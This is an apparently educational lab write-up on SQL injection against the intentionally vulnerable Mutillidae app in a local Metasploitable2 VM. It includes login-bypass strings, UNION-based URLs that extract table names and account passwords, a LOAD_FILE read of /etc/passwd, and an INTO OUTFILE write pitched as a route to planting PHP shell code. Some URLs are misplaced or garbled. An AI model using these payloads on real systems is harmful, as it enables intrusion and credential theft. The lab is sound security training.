# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

<img width="577" alt="image" src="https://github.com/user-attachments/assets/f198d4de-631d-4d03-9c1d-73d48f5ed952">


Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

<img width="850" alt="image" src="https://github.com/user-attachments/assets/54894312-a495-4522-b1b0-568dda114625">

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

<img width="865" alt="image" src="https://github.com/user-attachments/assets/a41b7720-2a20-4c81-90a4-43f8f97955a4">

Click on the menu Login/Register and register for an account

<img width="860" alt="image" src="https://github.com/user-attachments/assets/46b289e4-8326-4b76-b9ce-cf05fa49da88">

Click on the link “Please register here”

<img width="850" alt="image" src="https://github.com/user-attachments/assets/64272921-4b51-43af-894b-9a4e320f615a">

Click on “Create Account” to display the following page:

<img width="857" alt="image" src="https://github.com/user-attachments/assets/bc0d29e3-4b86-4cb0-82dc-bc4acfb05841">


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:



($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.



<img width="848" alt="image" src="https://github.com/user-attachments/assets/1ff4872b-9b14-4344-acf1-ca1bd660a6a8">

Click “Login”. The logged in page will show as below:

<img width="856" alt="image" src="https://github.com/user-attachments/assets/c9a92b69-14a7-4a07-8a1b-04e5ffb62270">


##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

<img width="856" alt="image" src="https://github.com/user-attachments/assets/d32b8bc5-62a5-49b7-9a54-4ad10c2de5de">

Click the login button and you will see it enter into the administrator page.
<img width="850" alt="image" src="https://github.com/user-attachments/assets/48ff1119-0cd8-4e66-aa01-ce64205abbfb">



## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
<img width="860" alt="image" src="https://github.com/user-attachments/assets/39de269a-48f3-4158-a15e-ba87acad2f0e">


<img width="846" alt="image" src="https://github.com/user-attachments/assets/5ac61e77-663c-4367-b7a8-7600264510ac">


<img width="840" alt="image" src="https://github.com/user-attachments/assets/afe5e7b7-72de-4b85-982c-2783cc59664e">


<img width="856" alt="image" src="https://github.com/user-attachments/assets/0d4660ea-4c56-4e66-bac8-24e7d0d3f3ea">


<img width="850" alt="image" src="https://github.com/user-attachments/assets/3fd461a6-8bbd-42f5-bc6c-d32f90ceffc8">

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
<img width="816" alt="image" src="https://github.com/user-attachments/assets/64091cbc-ee7c-45d8-8d49-82af7769b944">


Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

(http://192.168.171.133/mutillidae/index.php?page=user-info.php&username=dharsan%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details)


<img width="848" alt="image" src="https://github.com/user-attachments/assets/f0c6b939-5f6c-4d9e-9105-94e984802b2b">


After adding the order by 6 into the existing url , the following error statement will be obtained:

<img width="848" alt="image" src="https://github.com/user-attachments/assets/f0c6b939-5f6c-4d9e-9105-94e984802b2b">


When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
<img width="865" alt="image" src="https://github.com/user-attachments/assets/72a633e3-23f3-4b0a-9853-64c02198b7e3">



 As it is having 5 columns the query worked fine and it provides the correct result


<img width="858" alt="image" src="https://github.com/user-attachments/assets/7c8e9c4d-eab4-4b84-8960-7e99f377055b">


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

<img width="860" alt="image" src="https://github.com/user-attachments/assets/44f170c1-ae0a-4a36-8334-777cfc285555">

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
<img width="858" alt="image" src="https://github.com/user-attachments/assets/84926334-1396-4bf3-aa60-7b62bd2c2484">

 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.171.133/mutillidae/index.php?page=user-info.php&username=dharsan%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

<img width="855" alt="image" src="https://github.com/user-attachments/assets/9dd4a26a-869e-4e78-94bf-768ff7a97bda">

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.171.133/mutillidae/index.php?page=user-info.php&username=dharsan%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

<img width="849" alt="image" src="https://github.com/user-attachments/assets/25d0d9a2-404f-46ba-9b5b-e5d2e5926268">


The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.




<img width="863" alt="image" src="https://github.com/user-attachments/assets/1b98e368-7f88-4fea-bf63-e232689409c1">

The column names of the accounts is displayed below for the following url:

c

![Screenshot 2023-06-10 225659](https://github.com/praveenst13/sqlinjection/assets/118787793/c820f87a-30cb-485b-b423-f6fd0e67c96e)





Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.171.133/mutillidae/index.php?page=user-info.php&username=dharsan%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

<img width="859" alt="image" src="https://github.com/user-attachments/assets/f7e807b5-8ffb-4de8-a6ad-bdb786832ceb">


## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.171.133/mutillidae/index.php?page=user-info.php&username=dharsan%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
<img width="865" alt="image" src="https://github.com/user-attachments/assets/6b678260-1f29-40dd-a881-7e3d7b10c518">

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
